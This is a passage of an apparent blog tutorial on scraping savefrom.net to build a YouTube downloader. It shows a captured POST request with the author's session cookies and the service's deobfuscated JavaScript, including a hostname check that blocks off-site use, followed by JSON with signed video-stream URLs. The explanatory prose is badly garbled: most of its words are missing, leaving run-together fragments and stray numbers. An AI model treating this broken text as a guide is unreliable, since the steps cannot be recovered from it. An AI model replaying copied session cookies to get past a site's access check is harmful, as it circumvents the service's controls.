</h3><p>IDEhttppythonpostpycharm<code>httpClient</code>(2<code>Shift</code><code>Tools</code><code>httpClient</code>)<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-3.png" alt="httpclient"><br><code>headers</code>post<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-4.png" alt="headers"><br><code>formdata</code><code>headers</code><br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-5.png" alt="formdata"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST https://en.savefrom.net/savefrom.php</span><br><span class="line">cache-Control: no-cache</span><br><span class="line">accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cookie: lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; _ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; PHPSESSID=4aojkm49oj7h3de65pekqii337; x-requested-with=; PHPSESSUD=122fb7e10af37e23d99e896fd188744f; _gat_helperWidget=1; _gat_inpagePush2=1</span><br><span class="line">origin: https://en.savefrom.net</span><br><span class="line">pragma: no-cache</span><br><span class="line">referer: https://en.savefrom.net/1-youtube-video-downloader-4/</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;87&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;87&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-fetch-dest: iframe</span><br><span class="line">sec-fetch-mode: navigate</span><br><span class="line">sec-fetch-site: same-origin</span><br><span class="line">sec-fetch-user: ?1</span><br><span class="line">upgrade-insecure-requests: 1</span><br><span class="line">user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"></span><br><span class="line">sf_url=https://www.youtube.com/watch?v=YPvtz1lHRiw&amp;sf_submit=&amp;new=1&amp;lang=en&amp;app=&amp;country=cn&amp;os=Windows&amp;browser=Chrome</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sf_url</code>youtube</p><h3 id="iv-"><a href="#iv-" class="headerlink" title="iv."></a>iv.</h3><p><code>console</code><code>window</code>url<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-6.png" alt="window"><br>htmljsurl<code>source</code>IDE<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-7.png" alt="sources"><br><br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-8.png" alt="code"><br>js</p><ul><li>39</li><li>10<code>$b</code><code>this</code><code>window</code></li><li>11133</li><li>1415</li></ul><p>1415</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$d</span> = $d;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$a</span> = $a;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$e</span> = $e;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$k</span> = $k;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$c</span> = $c;</span><br><span class="line">$c = <span class="title function_">_q</span>($c);</span><br><span class="line">$c = <span class="title function_">_b</span>($c);</span><br><span class="line"><span class="title function_">_m</span>($b, $c);</span><br></pre></td></tr></table></figure><p>53</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$c = <span class="title function_">_q</span>($c);</span><br><span class="line">$c = <span class="title function_">_b</span>($c);</span><br><span class="line"><span class="title function_">_m</span>($b, $c);</span><br></pre></td></tr></table></figure><p><br><code>console</code><br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-9.png" alt="console"><br><br><br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-10.png" alt="console2"><br><br><br>js</p><h3 id="v-"><a href="#v-" class="headerlink" title="v."></a>v.</h3><p><code>console</code>JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">del</span>(<span class="params"></span>)&#123;<span class="keyword">while</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>)&#123;<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">removeChild</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>);&#125;&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hostname</span>.<span class="title function_">search</span>(<span class="regexp">/(?:^|\.|@)(savefrom\.net|sfrom\.net|savefrom\.com\.au|51\.159\.57\.158|(?:fe\d*|test)-front\.sf-apps\.com)$/i</span>) == -<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;Please go to http://savefrom.net/ to get direct links&#x27;</span>);</span><br><span class="line"><span class="title function_">del</span>();</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showResult</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> success = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> d = <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">document</span>;</span><br><span class="line"><span class="keyword">if</span>(d &amp;&amp; d.<span class="property">getElementById</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> e = d.<span class="title function_">getElementById</span>(<span class="string">&#x27;sf_result&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(e &amp;&amp; e.<span class="property">innerHTML</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="title function_">finishRequest</span>(<span class="literal">true</span>);;</span><br><span class="line">e.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">sf</span>.<span class="property">videoResult</span>.<span class="title function_">show</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;YPvtz1lHRiw&quot;</span>,<span class="string">&quot;cipher&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;meta&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;The Most Genius Plays in Football&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;https:\/\/www.youtube.com\/watch?v=YPvtz1lHRiw&quot;</span>,<span class="string">&quot;duration&quot;</span>:<span class="string">&quot;7:03&quot;</span>,<span class="string">&quot;tags&quot;</span>:<span class="string">&quot;lionel messi,football tiki taka,football highlight,football team plays,kevin de bruyne,mesut \u00f6zil,paul pogba,cristiano ronaldo,adama traore,luka modric,toni kroos,andres iniesta,kylian mbappe,neymar jr,zlatan ibrahimovic,franck ribery,paulo dybala,philippe coutinho,robert lewandowski,barcelona,real madrid,liverpool,manchester city&quot;</span>&#125;,<span class="string">&quot;thumb&quot;</span>:<span class="string">&quot;https:\/\/i.ytimg.com\/vi\/YPvtz1lHRiw\/hqdefault.jpg&quot;</span>,<span class="string">&quot;itags&quot;</span>:[<span class="string">&quot;18&quot;</span>,<span class="string">&quot;22&quot;</span>,<span class="string">&quot;133&quot;</span>,<span class="string">&quot;134&quot;</span>,<span class="string">&quot;135&quot;</span>,<span class="string">&quot;136&quot;</span>,<span class="string">&quot;137&quot;</span>,<span class="string">&quot;140&quot;</span>,<span class="string">&quot;160&quot;</span>,<span class="string">&quot;242&quot;</span>,<span class="string">&quot;243&quot;</span>,<span class="string">&quot;244&quot;</span>,<span class="string">&quot;247&quot;</span>,<span class="string">&quot;248&quot;</span>,<span class="string">&quot;249&quot;</span>,<span class="string">&quot;250&quot;</span>,<span class="string">&quot;251&quot;</span>,<span class="string">&quot;278&quot;</span>],<span class="string">&quot;video_quality&quot;</span>:[<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;720&quot;</span>,<span class="string">&quot;480&quot;</span>,<span class="string">&quot;360&quot;</span>,<span class="string">&quot;240&quot;</span>,<span class="string">&quot;144&quot;</span>],<span class="string">&quot;url&quot;</span>:[&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=18&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;gir=yes&amp;clen=35202709&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603720879883261&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5531422&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgN_iBsjO6zSiW9dcOYYExfjeVuy1YCXtWcKT0cz2kMcECIQCMre2rssbqkWdohk9K4Ej8B8r9gARVc0-kAHVqhV1teQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;360&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">35202709</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 360&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;0c41b67f74ccb97e50f2e64fe5f4625a&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&amp;title=The%20Most%20Genius%20Plays%20in%20Football&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=22&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=H2IuXFgrekwcd2kUgtraypIF&amp;ratebypass=yes&amp;dur=423.137&amp;lmt=1603723118280830&amp;mt=1610277156&amp;fvip=4&amp;c=WEB&amp;txp=5535432&amp;n=9544-WEiIwBMq_&amp;sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cratebypass%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIgWg_KEKuXDFH-OcphoOxU2tjE9B0WnidilKpa-vtbmigCIQD-eJlhFHZMi1VzRYI_jh0RZaMiLkkXYWnwGM2TJp0bLA%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;720&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;22&quot;</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 720&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;674fa89ee246148990b3f36e750a5d32&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MP4&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=137&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fmp4&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=177708494&amp;dur=422.999&amp;lmt=1603723164407782&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRQIhANMFMA1ypwGQjiGT_DlqlYwfqcqu1IlKZGoCrdIqWmzHAiAyOJJHIzUBcMQ6WBeEnepV4UlD3TY6rGSNKBVSVhbpIQ%3D%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;mp4 dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;mp4&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;137&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">177708494</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;6816215e43020185bb429874c33f1f73&quot;</span>&#125;,&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;WEBM&quot;</span>,<span class="string">&quot;subname&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;info_url&quot;</span>:<span class="string">&quot;https:\/\/r4---sn-25glene7.googlevideo.com\/videoplayback?expire=1610299253&amp;ei=FeP6X7qLJvesxN8PteeBaA&amp;ip=154.72.187.26&amp;id=o-AFTOjos_M4e5ymyJ3pa8Zs6JxHQohnez1oxdyfxNGuFl&amp;itag=248&amp;aitags=133%2C134%2C135%2C136%2C137%2C160%2C242%2C243%2C244%2C247%2C248%2C278&amp;source=youtube&amp;requiressl=yes&amp;mh=nS&amp;mm=31%2C29&amp;mn=sn-25glene7%2Csn-25ge7nzs&amp;ms=au%2Crdu&amp;mv=m&amp;mvi=4&amp;pl=20&amp;initcwndbps=182500&amp;vprv=1&amp;mime=video%2Fwebm&amp;ns=QmTnf2BHCkCLm1nUC3OlqIwF&amp;gir=yes&amp;clen=117037047&amp;dur=422.999&amp;lmt=1603725149388225&amp;mt=1610277156&amp;fvip=4&amp;keepalive=yes&amp;c=WEB&amp;txp=5535432&amp;n=TD5jnO4_esWW9m&amp;sparams=expire%2Cei%2Cip%2Cid%2Caitags%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cdur%2Clmt&amp;sig=AOq0QJ8wRgIhANFyBfTGjhDMawSTzN1NjLLYLztYc8e6w3lXVXY5ldbxAiEA-UBT6Yb33Sr0Yhan0x9xlf1xVWFH-wu_y2HsgWkiuXo%3D&amp;lsparams=mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig=AG3C_xAwRgIhALlbQJhLhsKk9tVJdpd0OfXwuiWC26m4cDjWZ8MvxO1MAiEA8EG4gFtyQVAWXRWz_d3DYsCTY4oCiTobXSHKnemPR38%3D&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;webm dash&quot;</span>,<span class="string">&quot;ext&quot;</span>:<span class="string">&quot;webm&quot;</span>,<span class="string">&quot;downloadable&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;quality&quot;</span>:<span class="string">&quot;1080&quot;</span>,<span class="string">&quot;audio&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;no_audio&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;itag&quot;</span>:<span class="string">&quot;248&quot;</span>,<span class="string">&quot;filesize&quot;</span>:<span class="number">117037047</span>,<span class="string">&quot;attr&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;video format: 1080 (without audio)&quot;</span>,<span class="string">&quot;class&quot;</span>:<span class="string">&quot;no-audio&quot;</span>&#125;,<span class="string">&quot;info_token&quot;</span>:<span class="string">&quot;43e803aa40437c9930975615121cc2c5&quot;</span>&#125;],<span class="string">&quot;hosting&quot;</span>:<span class="number">101</span>,<span class="string">&quot;srv&quot;</span>:<span class="string">&quot;s30&quot;</span>,<span class="string">&quot;sd&quot;</span>:<span class="literal">null</span>,<span class="string">&quot;hd&quot;</span>:<span class="literal">null</span>&#125;);;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span 